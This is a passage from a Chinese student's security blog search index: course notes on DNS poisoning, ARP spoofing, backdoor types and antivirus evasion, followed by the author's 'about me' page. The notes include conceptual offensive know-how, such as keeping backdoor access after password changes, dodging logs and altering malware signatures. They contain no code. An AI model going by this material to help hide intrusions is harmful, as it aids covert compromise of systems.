title="DNS缓存中毒"></a>DNS缓存中毒</h4><p>DNS缓存中毒攻击者给DNS服务器注入非法网络域名地址，如果服务器接受这个非法地址，那说明其缓存就被攻击了，而且以后响应的域名请求将会受黑客所控。当这些非法地址进入服务器缓存，用户的浏览器或者邮件服务器就会自动跳转到DNS指定的地址。这种攻击往往被归类为域欺骗攻击(pharming attack)，由此它会导致出现很多严重问题。首先，用户往往会以为登陆的是自己熟悉的网站，而它们却并不是。与钓鱼攻击采用非法URL不同的是，这种攻击使用的是合法的URL地址。</p><h4 id="域名劫持（DNS重定向）"><a href="#域名劫持（DNS重定向）" class="headerlink" title="域名劫持（DNS重定向）"></a>域名劫持（DNS重定向）</h4><p>域名劫持是通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。域名劫持一方面可能影响用户的上网体验，用户被引到假冒的网站进而无法正常浏览网页，而用户量较大的网站域名被劫持后恶劣影响会不断扩大；另一方面用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。</p><h4 id="DNS查询嗅探"><a href="#DNS查询嗅探" class="headerlink" title="DNS查询嗅探"></a>DNS查询嗅探</h4><ol><li>攻击者主要利用对DNS的配置信息获取网络环境的信息，为之后的攻击做好的准备。</li><li>针对这些情况，我们需要对DNS服务器需要采取特别的安全保护措施，在防火墙网络中，分开设置内部DNS服务器和外部DNS服务器，连接外部服务的外部DNS服务器上不留有对外禁止访问的内部网络系统的服务器，做到内外网络服务器分割。</li></ol><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol><li>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。ARP攻击主要是存在于局域网网络中，局域网中若有一台计算机感染ARP病毒，则感染该ARP病毒的系统将会试图通过”ARP欺骗”手段截获所在网络内其它计算机的通信信息，并因此造成网内其它计算机的通信故障。</li><li>ARP欺骗通常是在用户局网中，造成用户访问域名的错误指向。如果IDC机房也被ARP病毒入侵后，则也可能出现攻击者采用ARP包压制正常主机、或者压制DNS服务器，以使访问导向错误指向的情况。</li></ol><h4 id="本机劫持"><a href="#本机劫持" class="headerlink" title="本机劫持"></a>本机劫持</h4><p>本机的计算机系统被木马或流氓软件感染后，也可能会出现部分域名的访问异常。</p><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><h3 id="常见脚本语言"><a href="#常见脚本语言" class="headerlink" title="常见脚本语言"></a>常见脚本语言</h3><ol><li>一种介乎于 <code>HTML</code> 和诸如 <code>Java</code> 、 <code>Visual Basic</code> 、 <code>C++</code>等编程语言之间的一种特殊的语言。</li><li>尽管它更接近后者，但它却不具有编程语言复杂、严谨的语法和规则。</li><li>常见的脚本语言有：<code>Python</code>、<code>JavaScript</code>、<code>Asp</code> (逐渐淘汰，基本都是小站点在使用)、<code>Aspx</code>、<code>PHP</code> （目前比较流行）<code>javaweb</code>、 <code>pl</code>、<code>cgi</code>等</li></ol><h3 id="不同脚本类型与安全漏洞的关系"><a href="#不同脚本类型与安全漏洞的关系" class="headerlink" title="不同脚本类型与安全漏洞的关系"></a>不同脚本类型与安全漏洞的关系</h3><ul><li>不同的脚本语言的编写规则不一样，程序产生的漏洞自然也不一样（代码审计）。</li></ul><h3 id="漏洞挖掘代码审计与脚本类型的关系"><a href="#漏洞挖掘代码审计与脚本类型的关系" class="headerlink" title="漏洞挖掘代码审计与脚本类型的关系"></a>漏洞挖掘代码审计与脚本类型的关系</h3><ul><li>漏洞挖掘代码审计：要熟悉相关代码和相关逻辑机制</li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="什么是后门？有那些后门？"><a href="#什么是后门？有那些后门？" class="headerlink" title="什么是后门？有那些后门？"></a>什么是后门？有那些后门？</h3><ol><li>在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。</li><li>后门的最主要目的就是方便以后再次秘密进入或者控制系统。</li></ol><h3 id="后门的分类"><a href="#后门的分类" class="headerlink" title="后门的分类"></a>后门的分类</h3><ol><li><p>网页后门 ：<br> 此类后门程序一般都是服务器上正常 的web服务来构造自己的连接方式，比如现在非常流行的ASP、cgi脚本后门等。</p></li><li><p>线程插入后门：<br> 利用系统自身的某个服务或者线程，将后门程序插入到其中，具体原理原来《黑客防线》曾具体讲解过，感兴趣的朋友可以查阅。这也是现在最流行的一个后门技术。</p></li><li><p>扩展后门：<br> 所谓的“扩展”，是指在功能上有大的提升，比普通的单一功能的后门有很强的使用性，这种后门本身就相当于一个小的安全工具包，能实现非常多的常驻见安全功能，适合新手使用————但是，功能越强，个人觉得反而脱郭后门“隐蔽”的初衷，具体看法就看各位使用都的喜好了。</p></li><li><p>C&#x2F;S后门（客户端服务器后门）：<br> 和传统的木马程序类似的控制方法，采用“客记端&#x2F;服务端”的控制方式，通过某种特定的访问方式来启动后门进而控制服务器。</p></li></ol><h3 id="后门在安全测试中的实际意义"><a href="#后门在安全测试中的实际意义" class="headerlink" title="后门在安全测试中的实际意义"></a>后门在安全测试中的实际意义</h3><ol><li>方便下次更方便的进来。</li><li>获取到相关权限之后，后门相当于一个管道，便于操作。</li><li>即使管理员通过改变所有密码之类的方法来提高安全性，仍然能再次侵入，使再次侵入被发现的可能性减至最低。</li><li>大多数后门设法躲过日志，大多数情况下即使入侵者正在使用系统也无法显示他已在线。</li></ol><h3 id="关于后门需要了解那些？-玩法，免杀"><a href="#关于后门需要了解那些？-玩法，免杀" class="headerlink" title="关于后门需要了解那些？(玩法，免杀)"></a>关于后门需要了解那些？(玩法，免杀)</h3><ol><li><p>玩法（创建后门之后我们可以怎么样操作？）<br> 网站后门：便于控制网站<br> 软件后门：用于控制<br> 服务器后门：可以进行脱库、盗取信息</p></li><li><p>免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。</p></li><li><p>由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。</p></li><li><p>其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p></li><li><p>后门需要掌握的核心技能，防止杀毒软件检查到</p></li></ol><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web的组成框架模型"><a href="#web的组成框架模型" class="headerlink" title="web的组成框架模型"></a>web的组成框架模型</h3><ul><li>WEB的组成框架模型：网站原码、操作系统、中间件（搭建平台，提供服务的）、数据库。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E7%9A%84%E7%BB%84%E6%88%90%E6%A1%86%E6%9E%B6.png" alt="Web的组成框架"></li></ul><h3 id="架构漏洞安全测试的简要测试"><a href="#架构漏洞安全测试的简要测试" class="headerlink" title="架构漏洞安全测试的简要测试"></a>架构漏洞安全测试的简要测试</h3><ol><li><p>通信层<br> 主要测试通信协议的安全，系统开放的端口，其中操作系统提供网络层和数据链路层协议，存在问题的可能性较小，一般关注开源协议已存在漏洞即可，无需重点关注。应用层服务与协议一般由产品形态决定，产品中可以自定义配置相关协议与参数，需要重点关注与测试。</p></li><li><p>应用层<br> 应用层包含开发人员开发代码，为整个安全测试的核心模块。主要包括web安全测试，源码安全测试。其中web安全测试从web访问服务的维度，偏向黑盒，进行安全测试。源码安全测试从代码的维度，偏向白盒，进行安全测试。</p></li><li><p>系统层<br> 主要测试操作系统安全，数据库服务安全，web服务器安全，以及其他一些中间件的安全。</p></li><li><p>管理层<br> 主要包括产品资料的安全测试，安全策略制定，协调各个层面的安全测试以及安全风险的整体评估。</p></li></ol><h3 id="为什么要从web界面为主"><a href="#为什么要从web界面为主" class="headerlink" title="为什么要从web界面为主"></a>为什么要从web界面为主</h3><p>因为web使用方面广 。从web方向先入手，一步一步的获取最高权限。</p><h2 id="Web相关漏洞"><a href="#Web相关漏洞" class="headerlink" title="Web相关漏洞"></a>Web相关漏洞</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/web%E6%BC%8F%E6%B4%9E.png" alt="Web相关漏洞"></p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h2><h3 id="多级域名的枚举查找"><a href="#多级域名的枚举查找" class="headerlink" title="多级域名的枚举查找"></a>多级域名的枚举查找</h3><ul><li>layer子域名探测<br>链接：<a href="https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A">https://pan.baidu.com/s/1YFu9V0WtdG905eaVFNFa0A</a><br>提取码：zkaq<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-28%20201908.png" alt="layer子域名挖掘机"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关于我的</title>
      <link href="/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/"/>
      <url>/2023/08/25/%E6%9C%89%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h1 id="有关于我的"><a href="#有关于我的" class="headerlink" title="有关于我的"></a>有关于我的</h1><hr><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E6%A2%A6%E6%AF%94%E4%BC%98%E6%96%AF.jpg" alt="Alien"></p><blockquote><p>永远相信美好的事情即将发生，因为追求源于热爱！</p></blockquote><h3 id="关于Alien"><a href="#关于Alien" class="headerlink" title="关于Alien"></a>关于Alien</h3><p>你好，我叫Alien，是个在校大学生，开发者，2021年开始学习相关开发知识。</p><ul><li><strong>就读院校：</strong> 东莞理工学院（是本科！！！）</li><li><strong>本科专业：</strong> 网络空间安全</li><li><strong>个人爱好：</strong> 听歌、看电影、奥特曼、游戏</li></ul><h3 id="细说个人爱好"><a href="#细说个人爱好" class="headerlink" title="细说个人爱好"></a>细说个人爱好</h3><p>喜欢的音乐人主要是周杰伦、林俊杰、陈奕迅、五月天、张杰、Zard坂井泉水（我女神）、久石让（他的音乐真的很好听）、Radwimps、米津玄师，平时没事就听歌，可以说是个终身爱好了。<br>喜欢的电影有幽灵公主（强烈推荐）、哈尔的移动城堡、天空之城。（很不巧，都是宫崎骏的）<br>游戏玩的不多，像云顶之弈这种比较多人玩，比较喜欢单机的游戏，比如极限竞速：地平线、塞尔达传说：王国之泪、GTA5。<br>应该没有人不喜欢奥特曼吧！（\狗头）</p><h3 id="怎样能够联系到我呢？"><a href="#怎样能够联系到我呢？" class="headerlink" title="怎样能够联系到我呢？"></a>怎样能够联系到我呢？</h3><p>邮箱：<a href="mailto:&#49;&#49;&#x39;&#51;&#49;&#51;&#51;&#x31;&#x30;&#x35;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#49;&#49;&#x39;&#51;&#49;&#51;&#51;&#x31;&#x30;&#x35;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a><br>Github：<a href="https://github.com/M78Alien">M78Alien</a><br>B站：<a href="https://space.bilibili.com/360390916?spm_id_from=333.1007.0.0">Alien船长大人</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
